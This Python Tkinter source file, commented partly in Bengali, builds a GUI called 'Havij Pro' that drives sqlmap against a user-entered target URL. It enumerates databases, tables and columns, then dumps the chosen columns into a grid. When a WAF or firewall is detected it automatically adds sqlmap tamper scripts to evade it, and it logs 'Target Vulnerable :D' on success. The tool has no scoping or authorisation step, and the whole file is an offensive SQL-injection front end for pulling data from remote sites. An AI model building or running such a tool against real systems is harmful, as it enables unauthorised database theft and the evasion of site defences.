import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import subprocess
import threading
import sys
import os
import re
import socket
from urllib.parse import urlparse

# Pillow লাইব্রেরি থেকে প্রয়োজনীয় মডিউল ইম্পোর্ট করা
try:
    from PIL import Image, ImageTk
except ImportError:
    print("Error: Pillow library not found. Please install it using 'pip install Pillow'")
    sys.exit(1)

class HavijProGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Havij Pro 15.17 - Advanced SQL Injection Tool")
        self.root.geometry("706x696")
        self.root.configure(bg="#f0f0f0")
        
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", rowheight=20, font=("Tahoma", 9))
        style.configure("Treeview.Heading", font=("Tahoma", 9, "bold"), background="#e0e0e0")

        # ================= LOAD & RESIZE ICONS =================
        self.icons = {}
        base_dir = os.path.dirname(os.path.abspath(__file__))
        self.packet_dir = os.path.join(base_dir, "packet")
        
        # আউটপুট সাইজ ৩০x৩০ নির্ধারণ করা
        ICON_SIZE = (30, 30)
        
        # ফাংশনটি যেকোনো সাইজের ইমেজ লোড করে ৩০x৩০ করে দিবে
        def get_and_force_resize_icon(name, filename):
            path = os.path.join(self.packet_dir, filename)
            if os.path.exists(path):
                try:
                    # Pillow দিয়ে ইমেজ ওপেন করা
                    pil_img = Image.open(path)
                    
                    # জোরপূর্বক ৩০x৩০ সাইজে রিসাইজ করা (Resampling ব্যবহার করে মান ভালো রাখার জন্য)
                    resized_pil_img = pil_img.resize(ICON_SIZE, Image.Resampling.LANCZOS)
                    
                    # Pillow ইমেজকে Tkinter-এর PhotoImage-এ রূপান্তর করা
                    tk_img = ImageTk.PhotoImage(resized_pil_img)
                    
                    # Garbage Collection থেকে বাঁচাতে স্টোর করা
                    self.icons[name] = tk_img
                    return tk_img
                except Exception as e:
                    print(f"Error loading/resizing {filename}: {e}")
            return None

        # Load specific icons (play and stop are dynamic)
        self.icon_play = get_and_force_resize_icon("play", "play.png")
        self.icon_stop = get_and_force_resize_icon("stop", "stop.png")
        
        # ================= TOP FRAME =================
        top_frame = tk.Frame(root, bg="#f0f0f0", pady=10, padx=10)
        top_frame.pack(fill=tk.X)
        
        # URL Row
        tk.Label(top_frame, text="Target:", bg="#f0f0f0", font=("Tahoma", 9, "bold")).grid(row=0, column=0, sticky="w")
        self.url_entry = tk.Entry(top_frame, font=("Tahoma", 9), width=60, relief="solid", bd=1)
        self.url_entry.grid(row=0, column=1, padx=10, pady=5)
        
        # Dynamic Analyze/Stop Button
        analyze_kwargs = {
            "text": "Analyze", "command": self.analyze_url,
            "bg": "#f0f0f0", "relief": "flat", "cursor": "hand2", "font": ("Tahoma", 9, "bold")
        }
        if self.icon_play:
            analyze_kwargs["image"] = self.icon_play
            analyze_kwargs["compound"] = tk.TOP
            
        self.analyze_btn = tk.Button(top_frame, **analyze_kwargs)
        self.analyze_btn.grid(row=0, column=2, padx=10)

        # ================= TOOLBAR =================
        toolbar_frame = tk.Frame(root, bg="#f0f0f0", pady=5, padx=10)
        toolbar_frame.pack(fill=tk.X)

        actions = [
            ("About", get_and_force_resize_icon("about", "about.png"), self.show_about_view),
            ("Get DBs", get_and_force_resize_icon("db", "db.png"), self.get_dbs),
            ("Get Tables", get_and_force_resize_icon("tables", "tables.png"), self.get_tables),
            ("Get Columns", get_and_force_resize_icon("columns", "columns.png"), self.get_columns),
            ("Get Data", get_and_force_resize_icon("data", "data.png"), self.get_data)
        ]
        
        for text, img, cmd in actions:
            btn_kwargs = {
                "text": text, "command": cmd, 
                "bg": "#f0f0f0", "relief": "flat", "cursor": "hand2", "font": ("Tahoma", 9, "bold")
            }
            if img:
                btn_kwargs["image"] = img
                btn_kwargs["compound"] = tk.TOP # আইকন উপরে, টেক্সট নিচে
                
            btn = tk.Button(toolbar_frame, **btn_kwargs)
            btn.pack(side=tk.LEFT, padx=5)

        self.batch_var = tk.BooleanVar(value=True)
        tk.Checkbutton(toolbar_frame, text="Auto Mode (Batch)", variable=self.batch_var, bg="#f0f0f0", font=("Tahoma", 9)).pack(side=tk.RIGHT)

        # ================= MAIN CONTAINER =================
        self.main_container = tk.Frame(root, bg="#f0f0f0")
        self.main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # ---------------- ABOUT FRAME ----------------
        self.about_frame = tk.Frame(self.main_container, bg="white", relief="solid", bd=1)
        
        # About Content
        tk.Label(self.about_frame, text="Havij Pro 15.17 - Advanced SQL Injection Tool", font=("Tahoma", 12, "bold"), bg="white").pack(pady=(20, 10))
        
        info_frame = tk.Frame(self.about_frame, bg="white")
        info_frame.pack(pady=10)
        
        tk.Label(info_frame, text="Version 15.17 Pro", font=("Tahoma", 10), bg="white").grid(row=0, column=0, sticky="w")
        tk.Label(info_frame, text="Copyright © 2026", font=("Tahoma", 10), bg="white").grid(row=1, column=0, sticky="w")
        
        tk.Label(self.about_frame, text="http://arenawebsecurity.net", font=("Tahoma", 10), fg="blue", bg="white", cursor="hand2").pack(pady=(10, 0))
        tk.Label(self.about_frame, text="qrteam@arenawebsecurity.net", font=("Tahoma", 10), fg="blue", bg="white", cursor="hand2").pack()
        
        tk.Label(self.about_frame, text="Supported Data Bases:", font=("Tahoma", 9, "bold"), bg="white").pack(pady=(20, 5))
        db_list = "MsSQL with error\nMsSQL no error\nMsSQL Blind\nMsAccess\nMsAccess Blind\nMySQL\nOracle"
        tk.Label(self.about_frame, text=db_list, font=("Tahoma", 9), bg="white", justify=tk.LEFT).pack()

        # ---------------- DATA FRAME (Paned Window) ----------------
        self.data_frame = tk.Frame(self.main_container, bg="#f0f0f0")
        self.paned_window = ttk.PanedWindow(self.data_frame, orient=tk.HORIZONTAL)
        self.paned_window.pack(fill=tk.BOTH, expand=True)

        # --- LEFT PANE (Treeview) ---
        left_frame = tk.Frame(self.paned_window, bg="white", relief="solid", bd=1)
        self.paned_window.add(left_frame, weight=1)
        
        tk.Label(left_frame, text="Databases & Tables", bg="#e0e0e0", font=("Tahoma", 9, "bold")).pack(fill=tk.X)
        
        self.tree = ttk.Treeview(left_frame, show="tree")
        self.tree.pack(fill=tk.BOTH, expand=True)
        self.tree.bind("<Button-1>", self.toggle_checkbox)
        
        tree_scroll = ttk.Scrollbar(self.tree, orient="vertical", command=self.tree.yview)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.configure(yscrollcommand=tree_scroll.set)

        # --- RIGHT PANE (Data Grid) ---
        right_frame = tk.Frame(self.paned_window, bg="white", relief="solid", bd=1)
        self.paned_window.add(right_frame, weight=2)
        
        tk.Label(right_frame, text="Dumped Data", bg="#e0e0e0", font=("Tahoma", 9, "bold")).pack(fill=tk.X)
        
        self.data_grid = ttk.Treeview(right_frame, show="headings")
        self.data_grid.pack(fill=tk.BOTH, expand=True)
        
        grid_scroll = ttk.Scrollbar(self.data_grid, orient="vertical", command=self.data_grid.yview)
        grid_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.data_grid.configure(yscrollcommand=grid_scroll.set)

        # Initialize Default View (About)
        self.show_about_view()

        # --- CONTEXT MENUS ---
        self.grid_menu = tk.Menu(self.root, tearoff=0, font=("Tahoma", 9))
        self.grid_menu.add_command(label="Copy Cell", command=self.copy_grid_cell)
        self.grid_menu.add_command(label="Copy Row", command=self.copy_grid_row)
        self.data_grid.bind("<Button-3>", self.show_grid_menu) 

        self.log_menu = tk.Menu(self.root, tearoff=0, font=("Tahoma", 9))
        self.log_menu.add_command(label="Copy Selected", command=self.copy_log_text)
        self.log_menu.add_separator()
        self.log_menu.add_command(label="Clear Log", command=self.clear_log)

        # ================= BOTTOM FRAME (Log) =================
        bottom_frame = tk.Frame(root, bg="#f0f0f0", padx=10, pady=5)
        bottom_frame.pack(fill=tk.X, side=tk.BOTTOM)

        status_frame = tk.Frame(bottom_frame, bg="#f0f0f0")
        status_frame.pack(fill=tk.X)
        
        # --- Loading Spinner UI ---
        self.spinner_lbl = tk.Label(status_frame, text="", fg="red", bg="#f0f0f0", font=("Tahoma", 11, "bold"))
        self.spinner_lbl.pack(side=tk.LEFT)
        
        self.status_lbl = tk.Label(status_frame, text="Status: I'm IDLE", fg="blue", bg="#f0f0f0", font=("Tahoma", 9, "bold"))
        self.status_lbl.pack(side=tk.LEFT, padx=5)

        clear_btn = tk.Button(status_frame, text="Clear Log", command=self.clear_log, fg="blue", bg="#f0f0f0", relief="flat", cursor="hand2", font=("Tahoma", 9))
        clear_btn.pack(side=tk.RIGHT)

        self.log_area = scrolledtext.ScrolledText(bottom_frame, height=9, font=("Tahoma", 9), relief="solid", bd=1)
        self.log_area.pack(fill=tk.X, pady=2)
        self.log_area.bind("<Button-3>", self.show_log_menu)
        
        self.log_area.tag_config('blue', foreground='#0000FF') 
        self.log_area.tag_config('green', foreground='#008000') 
        self.log_area.tag_config('red', foreground='#FF0000') 
        self.log_area.tag_config('black', foreground='#000000')

        # State Variables
        self.current_process = None
        self.current_mode = None
        self.active_db_node = None
        self.active_table_node = None
        self.dump_cols = [] 
        self.is_analyze_mode = False
        self.selected_cols_order = [] 
        self.sqlmap_col_order = None
        self.clicked_cell_value = "" 
        
        self.waf_detected = False

        # Spinner Variables
        self.spinner_chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        self.spinner_idx = 0
        self.is_running = False

        self.log_area.insert(tk.END, "Havij Pro 15.17 ready!\n", 'green')

    # --- View Switchers ---
    def show_about_view(self):
        self.data_frame.pack_forget()
        self.about_frame.pack(fill=tk.BOTH, expand=True)

    def show_data_view(self):
        self.about_frame.pack_forget()
        self.data_frame.pack(fill=tk.BOTH, expand=True)

    # --- UI Toggle Logic ---
    def toggle_action_btn(self, is_running):
        if is_running:
            self.analyze_btn.config(text="Stop", command=self.stop_process, bg="#ffb3b3", fg="black")
            if "stop" in self.icons:
                self.analyze_btn.config(image=self.icons["stop"], compound=tk.TOP)
        else:
            self.analyze_btn.config(text="Analyze", command=self.analyze_url, bg="#f0f0f0", fg="black")
            if "play" in self.icons:
                self.analyze_btn.config(image=self.icons["play"], compound=tk.TOP)

    def start_spinner(self):
        self.is_running = True
        self.spin()

    def stop_spinner(self):
        self.is_running = False
        self.spinner_lbl.config(text="")

    def spin(self):
        if self.is_running:
            self.spinner_lbl.config(text=self.spinner_chars[self.spinner_idx])
            self.spinner_idx = (self.spinner_idx + 1) % len(self.spinner_chars)
            self.root.after(100, self.spin)

    def show_grid_menu(self, event):
        row_id = self.data_grid.identify_row(event.y)
        col_id = self.data_grid.identify_column(event.x)
        
        if row_id:
            self.data_grid.selection_set(row_id)
            if col_id:
                col_idx = int(col_id.replace('#', '')) - 1
                item_values = self.data_grid.item(row_id, "values")
                if 0 <= col_idx < len(item_values):
                    self.clicked_cell_value = item_values[col_idx]
                else:
                    self.clicked_cell_value = ""
            
            self.grid_menu.post(event.x_root, event.y_root)

    def copy_grid_cell(self):
        if self.clicked_cell_value:
            self.root.clipboard_clear()
            self.root.clipboard_append(str(self.clicked_cell_value))
            self.update_status("Cell data copied!", "green")

    def copy_grid_row(self):
        selected_item = self.data_grid.selection()
        if selected_item:
            item_values = self.data_grid.item(selected_item[0], "values")
            clipboard_text = " | ".join(map(str, item_values))
            self.root.clipboard_clear()
            self.root.clipboard_append(clipboard_text)
            self.update_status("Row copied to clipboard!", "green")

    def show_log_menu(self, event):
        self.log_menu.post(event.x_root, event.y_root)

    def copy_log_text(self):
        try:
            selected_text = self.log_area.get(tk.SEL_FIRST, tk.SEL_LAST)
            self.root.clipboard_clear()
            self.root.clipboard_append(selected_text)
        except tk.TclError:
            pass 

    def toggle_checkbox(self, event):
        row_id = self.tree.identify_row(event.y)
        if not row_id: return
        
        item_text = self.tree.item(row_id, "text")
        item_tags = self.tree.item(row_id, "tags")
        
        if item_text.startswith("☐ "):
            self.tree.item(row_id, text=item_text.replace("☐ ", "☑ ", 1))
            if item_tags and item_tags[0] == "col":
                if row_id not in self.selected_cols_order:
                    self.selected_cols_order.append(row_id)
                    
        elif item_text.startswith("☑ "):
            self.tree.item(row_id, text=item_text.replace("☑ ", "☐ ", 1))
            if item_tags and item_tags[0] == "col":
                if row_id in self.selected_cols_order:
                    self.selected_cols_order.remove(row_id)

    def get_checked_items(self, expected_tag=None):
        checked = []
        def traverse(node):
            text = self.tree.item(node, "text")
            item_tags = self.tree.item(node, "tags")
            if text.startswith("☑ "):
                clean_name = text.replace("☑ ", "")
                if not expected_tag or (item_tags and item_tags[0] == expected_tag):
                    checked.append((node, clean_name))
            for child in self.tree.get_children(node):
                traverse(child)
        for root_node in self.tree.get_children():
            traverse(root_node)
        return checked

    def add_to_tree(self, item_type, name, parent_id=""):
        node_id = f"{item_type}::{name}" if not parent_id else f"{parent_id}::{name}"
        if self.tree.exists(node_id): return node_id
        self.tree.insert(parent_id, "end", iid=node_id, text=f"☐ {name}", open=True, tags=(item_type,))
        return node_id

    def get_engine_path(self):
        current_dir = os.path.dirname(os.path.abspath(__file__))
        return os.path.join(current_dir, "sqlmap.py")

    def run_command(self, extra_args, mode):
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showwarning("URL Missing", "Please enter target URL first.")
            return

        engine_path = self.get_engine_path()
        if not os.path.exists(engine_path):
            messagebox.showerror("Error", "sqlmap.py not found in the same folder!")
            return

        self.current_mode = mode
        command = [sys.executable, engine_path, "-u", url]
        
        if self.batch_var.get(): command.append("--batch")
        
        if self.waf_detected:
            command.extend(["--tamper=space2comment,charencode,randomcase", "--level=2"])

        command.extend(extra_args)

        if mode == "dbs" and self.is_analyze_mode:
            self.log_area.insert(tk.END, f"Analyzing {url}\n", 'black')
            try:
                domain = urlparse(url).netloc.split(':')[0]
                ip = socket.gethostbyname(domain)
                self.log_area.insert(tk.END, f"Host IP: {ip}\n", 'black')
            except: pass
            self.update_status("Analyzing target", "red")
        elif mode == "dbs":
            self.update_status("Finding Databases", "red")
        elif mode == "tables":
            self.update_status("Finding Tables", "red")
        elif mode == "columns":
            self.update_status("Finding Columns", "red")
        elif mode == "data":
            self.update_status("Getting Column data", "orange")
        
        self.log_area.see(tk.END)
        self.start_spinner()
        self.toggle_action_btn(True)
        
        thread = threading.Thread(target=self.execute_engine, args=(command,))
        thread.daemon = True
        thread.start()

    def execute_engine(self, command):
        try:
            flags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            
            self.current_process = subprocess.Popen(
                command, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT, 
                creationflags=flags
            )
            
            for line in iter(self.current_process.stdout.readline, b''):
                decoded_line = line.decode('utf-8', errors='ignore')
                self.root.after(0, self.update_output, decoded_line)
                
            self.current_process.wait()
            
            finished_mode = self.current_mode
            self.current_mode = None
            
            self.root.after(0, self.stop_spinner)
            self.root.after(0, self.toggle_action_btn, False)
            self.root.after(0, self.update_status, "I'm IDLE", "blue")
            self.root.after(0, self.post_process_task, finished_mode)

        except Exception as e:
            self.root.after(0, self.stop_spinner)
            self.root.after(0, self.toggle_action_btn, False)
            self.root.after(0, self.update_output, f"Error: {str(e)}\n", 'red')

    def post_process_task(self, mode):
        if mode == "dbs" and self.is_analyze_mode:
            db_nodes = self.tree.get_children("")
            if len(db_nodes) == 1:
                node_id = db_nodes[0]
                item_text = self.tree.item(node_id, "text")
                if item_text.startswith("☐ "):
                    self.tree.item(node_id, text=item_text.replace("☐ ", "☑ ", 1))

    def update_status(self, text, color="blue"):
        self.status_lbl.config(text=f"Status: {text}", fg=color)

    def update_output(self, text, force_tag=None):
        if force_tag: 
            self.log_area.insert(tk.END, text, force_tag)
            self.log_area.see(tk.END)
            return

        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        clean_text = ansi_escape.sub('', text).strip()
        
        if not clean_text: return

        if re.search(r"(WAF|IPS|Cloudflare|ModSecurity|protection|firewall)", clean_text, re.IGNORECASE):
            if not self.waf_detected:
                self.waf_detected = True
                self.log_area.insert(tk.END, "\n⚠️ Target is protected by WAF/IPS. Auto-Bypass Activated!\n", 'red')

        if "web application technology:" in clean_text:
            tech = clean_text.split("technology:")[1].strip()
            self.log_area.insert(tk.END, f"Web Server: {tech}\n", 'black')
        elif "back-end DBMS:" in clean_text:
            dbms = clean_text.split("DBMS:")[1].strip()
            self.log_area.insert(tk.END, f"DB Server: {dbms}\n", 'black')
        elif "current database:" in clean_text:
            match = re.search(r"current database:\s+'([^']+)'", clean_text)
            if match:
                self.log_area.insert(tk.END, f"Current DB: {match.group(1)}\n", 'black')
        elif "injectable" in clean_text and "parameter" in clean_text:
            match = re.search(r"is '(.*?)' injectable", clean_text)
            if match:
                self.log_area.insert(tk.END, f"Injection type is {match.group(1)}\n", 'black')
                self.log_area.insert(tk.END, "Target Vulnerable :D\n", 'green')

        if self.current_mode == "dbs":
            if clean_text.startswith("[*] ") and "shutting down" not in clean_text.lower():
                raw_db_name = clean_text.replace("[*] ", "").strip()
                db_name = raw_db_name.replace("'", "").replace('"', "") 
                
                if db_name and " " not in db_name:
                    if self.is_analyze_mode and db_name.lower() == "information_schema": 
                        pass 
                    else:
                        self.show_data_view()
                        self.add_to_tree("db", db_name)
                        self.log_area.insert(tk.END, f"Data Base Found: {db_name}\n", 'black')

        elif self.current_mode == "tables":
            if clean_text.startswith("|") and clean_text.endswith("|") and not clean_text.startswith("|+"):
                parts = [p.strip() for p in clean_text.split("|") if p.strip()]
                if len(parts) >= 1:
                    tbl_name = parts[0]
                    if tbl_name.lower() not in ["table", "tables"] and tbl_name.replace("-", "").replace("_", "").strip():
                        if self.active_db_node:
                            self.show_data_view() 
                            self.add_to_tree("tbl", tbl_name, parent_id=self.active_db_node)
                            self.log_area.insert(tk.END, f"Table found: {tbl_name}\n", 'black')

        elif self.current_mode == "columns":
            if clean_text.startswith("|") and clean_text.endswith("|") and not clean_text.startswith("|+"):
                parts = [p.strip() for p in clean_text.split("|") if p.strip()]
                if len(parts) >= 1:
                    col_name = parts[0]
                    if col_name.lower() not in ["column", "type", "columns"] and col_name.replace("-", "").replace("_", "").strip():
                        if self.active_table_node:
                            self.show_data_view()
                            self.add_to_tree("col", col_name, parent_id=self.active_table_node)
                            self.log_area.insert(tk.END, f"Column found: {col_name}\n", 'black')

        elif self.current_mode == "data":
            if clean_text.startswith("|") and clean_text.endswith("|") and not clean_text.startswith("|+"):
                raw_parts = clean_text.split("|")[1:-1]
                parts = [p.strip() for p in raw_parts]
                
                if not getattr(self, 'sqlmap_col_order', None):
                    lower_dump_cols = [c.lower() for c in self.dump_cols]
                    if any(p.lower() in lower_dump_cols for p in parts):
                        self.sqlmap_col_order = parts
                        return
                
                if getattr(self, 'sqlmap_col_order', None) and len(parts) == len(self.sqlmap_col_order):
                    ordered_parts = []
                    lower_sqlmap_cols = [c.lower() for c in self.sqlmap_col_order]
                    for expected_col in self.dump_cols:
                        try:
                            idx = lower_sqlmap_cols.index(expected_col.lower())
                            ordered_parts.append(parts[idx])
                        except ValueError:
                            ordered_parts.append("")

                    if "".join(ordered_parts).replace("-", "").replace("_", "").strip():
                        self.show_data_view()
                        self.data_grid.insert("", "end", values=ordered_parts)
                        for idx, col in enumerate(self.dump_cols):
                            self.log_area.insert(tk.END, f"Data Found: {col}={ordered_parts[idx]}\n", 'black')

        self.log_area.see(tk.END)

    def analyze_url(self):
        self.is_analyze_mode = True 
        self.show_about_view() 
        self.tree.delete(*self.tree.get_children()) 
        self.run_command(["--dbs"], mode="dbs")

    def get_dbs(self):
        self.is_analyze_mode = False 
        self.show_data_view()
        self.tree.delete(*self.tree.get_children()) 
        self.run_command(["--dbs"], mode="dbs")

    def get_tables(self):
        self.show_data_view()
        checked_dbs = self.get_checked_items(expected_tag="db")
        if not checked_dbs: return messagebox.showwarning("Error", "Select Database!")
        self.active_db_node = checked_dbs[0][0]
        self.run_command(["-D", checked_dbs[0][1], "--tables"], mode="tables")

    def get_columns(self):
        self.show_data_view()
        checked_tables = self.get_checked_items(expected_tag="tbl")
        if not checked_tables: return messagebox.showwarning("Error", "Select Table!")
        self.active_table_node = checked_tables[0][0]
        tbl_name = checked_tables[0][1]
        db_name = self.tree.item(self.tree.parent(self.active_table_node), "text").replace("☑ ", "").replace("☐ ", "")
        self.run_command(["-D", db_name, "-T", tbl_name, "--columns"], mode="columns")

    def get_data(self):
        self.show_data_view()
        checked_columns = []
        for node_id in self.selected_cols_order:
            if self.tree.exists(node_id):
                text = self.tree.item(node_id, "text")
                if text.startswith("☑ "):
                    checked_columns.append((node_id, text.replace("☑ ", "")))
                    
        if not checked_columns: return messagebox.showwarning("Error", "Select Columns!")
        
        self.dump_cols = [item[1] for item in checked_columns]
        self.sqlmap_col_order = None 
        
        self.data_grid.delete(*self.data_grid.get_children())
        self.data_grid["columns"] = self.dump_cols
        for col in self.dump_cols:
            self.data_grid.heading(col, text=col)
            self.data_grid.column(col, width=120, anchor="center")

        tbl_node = self.tree.parent(checked_columns[-1][0])
        db_node = self.tree.parent(tbl_node)
        tbl_name = self.tree.item(tbl_node, "text").replace("☑ ", "").replace("☐ ", "")
        db_name = self.tree.item(db_node, "text").replace("☑ ", "").replace("☐ ", "")
        
        self.run_command(["-D", db_name, "-T", tbl_name, "-C", ",".join(self.dump_cols), "--dump"], mode="data")

    def stop_process(self):
        if self.current_process:
            self.stop_spinner() 
            self.current_process.terminate()
            self.update_output("Canceling...\n", "red")
            self.update_output("Job Canceled!\n", "red")
            self.update_status("Stopped", "red")
            self.toggle_action_btn(False)

    def clear_log(self):
        self.log_area.delete('1.0', tk.END)

if __name__ == "__main__":
    root = tk.Tk()
    app = HavijProGUI(root)
    root.mainloop()
